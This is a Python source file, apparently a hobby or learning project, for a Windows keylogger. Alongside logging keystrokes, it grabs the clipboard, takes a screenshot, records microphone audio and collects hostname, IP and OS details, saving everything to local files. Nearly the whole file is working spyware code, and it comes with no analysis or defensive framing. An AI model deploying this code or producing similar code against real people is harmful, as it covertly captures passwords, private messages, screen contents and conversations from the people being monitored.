#Import modules
import os
import time
import platform
import socket
import win32clipboard
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write as write_audio
import datetime

# ================== Configuration ==================
file_path = "C:\\Users\\hp\\Documents\\Python"  # Directory where it is to be stored
extend = "\\"

keys_grab = "key_logs.txt"
system_grab = "system_info.txt"
clipboard_grab = "clipboard.txt"
screenshot_grab = "screenshot.png"
audio_grab = "record.wav"


microphone_time = 10
time_iteration = 15
number_of_iterations_end = 2

# *********************** FUNCTIONS NEEDED TO RUN *************************************

def write_file(keys):
    with open(file_path + extend + keys_grab, "a") as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            elif key == Key.backspace:
                f.write("[BACKSPACE]")
            elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
                f.write("[SHIFT]")
            elif key == Key.caps_lock:
                f.write("[CAPS_LOCK]")
            elif key == Key.esc:
                f.write("[ESC]")
            elif hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(f"[{key}]")

                '''
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')

            elif k.find("Key") == -1:
                f.write(k)
                '''

# ********************* COPYING THE CONTENT OF THE SYSTEM'S CLIPBOARD **************************
def copy_clipboard():
    with open(file_path + extend + clipboard_grab, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f"Clipboard Data:\n{pasted_data}\n")
        except Exception as e:
            f.write(f"Clipboard could not be copied: {e}\n")

# ************************* TAKING SCREENSHOT OF THE SYSTEM SCREEN ******************************
def screenshot():
    print("Taking Screenshot at " + str(datetime.datetime.now()))
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_grab)

# ************************* RECORDS *************************************
def record_audio():
    fs = 44100
    seconds = microphone_time
    print("Recording Starting at" + str(datetime.datetime.now()))
    print("Recording audio...")
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    write_audio(file_path + extend + audio_grab, fs, recording)
    print("Audio recording ending at " + str(datetime.datetime.now()))


# ************************* GIVES BASIC COMPUTER INFO ***************************
def computer_information():
    with open(file_path + extend + system_grab, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("**************** SYSTEM INFOS **************\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"IP Address: {IPAddr}\n")
        f.write(f"More Information: {platform.architecture()}\n")
        f.write(f"More Information: {platform.platform()}\n")
        f.write(f"More Information: {platform.release()}\n")
        f.write(f"More Information: {platform.win32_ver()}\n")




count = 0       #setting to null
keys = []

def on_press(key):
    global keys, count      #making keys and count avaliable everywhere

    print(f"USED KEY: {key}")
    keys.append(key)
    count += 1

    if count >= 1:
        write_file(keys)
        keys = []
        count = 0

def on_release(key):
    if key == Key.esc:
        return False
    return True


# running the functions created
computer_information()
copy_clipboard()
screenshot()
record_audio()

print("[+] Starting keylogger...")
print("Starting at " + str(datetime.datetime.now()))

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("[+] Keylogger stopped at " + str(datetime.datetime.now()))

